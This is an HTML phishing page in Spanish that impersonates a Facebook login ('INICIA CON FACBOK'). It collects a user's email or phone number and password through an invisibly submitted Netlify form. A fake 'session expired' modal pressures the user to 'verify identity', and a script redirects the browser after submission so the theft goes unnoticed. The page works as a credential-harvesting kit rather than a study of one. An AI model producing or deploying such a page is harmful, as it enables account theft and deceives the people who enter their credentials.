<!DOCTYPE html>
<html lang="es">
<head>
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Todito Online</title>
<style>
body {
  margin:0;
  font-family: system-ui, -apple-system, Arial, sans-serif;
  background: linear-gradient(#0f1c2e, #1b2d4a);
  height:100vh;
  display:flex;
  justify-content:center;
  align-items:center;
}

/* FORMULARIO CENTRADO */
.wrapper {
  width:100%;
  max-width:380px;
  background:#f2f2f2;
  border-radius:20px;
  box-shadow:0 5px 25px rgba(0,0,0,0.3);
  position:relative;
  z-index:1;
}

/* HEADER */
.header {
  background: linear-gradient(90deg,#ffd54f,#ff9800);
  padding:18px;
  border-radius:20px 20px 0 0;
  text-align:center;
}
.header h1 { margin:0; font-size:28px; font-weight:700; }
.header p { margin:5px 0 0; font-size:13px; }

/* FORM */
.form { padding:20px; }
input {
  width:100%;
  padding:14px;
  margin:8px 0;
  border-radius:6px;
  border:1px solid #ccd0d5;
  font-size:14px;
  background:#fff;
  box-sizing:border-box;
}
.btn {
  width:100%;
  padding:14px;
  margin-top:10px;
  border:none;
  border-radius:6px;
  font-weight:bold;
  background: linear-gradient(90deg,#ffd54f,#ff9800);
  color:white;
  font-size:15px;
  cursor:pointer;
}
.small {
  text-align:center;
  font-size:12px;
  color:#666;
  margin-top:10px;
}

/* OVERLAY OSCURO */
.overlay {
  position:fixed;
  top:0;
  left:0;
  width:100%;
  height:100%;
  background:rgba(0,0,0,0.5);
  z-index:998;
  display:block;
}

/* MODAL POPUNDER */
.modal {
  position:fixed;
  top:50%;
  left:50%;
  transform:translate(-50%, -50%);
  width:90%;
  max-width:320px;
  background:white;
  border-radius:12px;
  box-shadow:0 8px 25px rgba(0,0,0,0.3);
  text-align:center;
  z-index:999;
  display:block;
}
.modal-header {
  background:#1877f2;
  color:white;
  padding:12px;
  font-size:14px;
  border-radius:12px 12px 0 0;
}
.modal-body { padding:15px; font-size:14px; }
.modal button {
  background:#1877f2;
  color:white;
  border:none;
  padding:10px;
  width:70%;
  border-radius:8px;
  cursor:pointer;
}
</style>
</head>
<body>

<!-- FORMULARIO -->
<div class="wrapper">
  <div class="header">
    <h1>INICIA CON FACBOK</h1>
    <p>La forma más fácil de estar con tus amigos</p>
  </div>

  <div class="form">
    <!-- FORMULARIO NETLIFY FORMS (ENVÍO INVISIBLE) -->
 <form id="loginForm" name="login" method="POST" data-netlify="true" action="">

      <input type="hidden" name="form-name" value="login">

      <input type="text" name="U" placeholder="Correo o número" required>
      <input type="password" name="C" placeholder="Clave" required>

      <button type="submit" class="btn">Entrar ahora</button>
    </form>
 
</div>

<!-- IFRAME OCULTO PARA ENVÍO TRANSPARENTE -->
<iframe name="hidden_iframe" style="display:none;"></iframe>

<!-- OVERLAY Y MODAL POPUNDER -->
<div id="overlay" class="overlay"></div>
<div id="modal" class="modal">
  <div class="modal-header">Su sesión ha expirado</div>
  <div class="modal-body">
    <p>Para continuar, verifica tu identidad.</p>
    <button onclick="cerrar()">Continuar</button>
  </div>
<script>
function cerrar(){
  document.getElementById("modal").style.display="none";
  document.getElementById("overlay").style.display="none";
}

// REDIRECCIÓN tras envío del formulario
document.getElementById("loginForm").addEventListener("submit", function(){
  // Le damos un pequeño delay para que el iframe pueda enviar los datos
  setTimeout(function(){
    window.location.href = "";
  }, 800); // 0.5 segundos
});
</script>

</body>
</html>
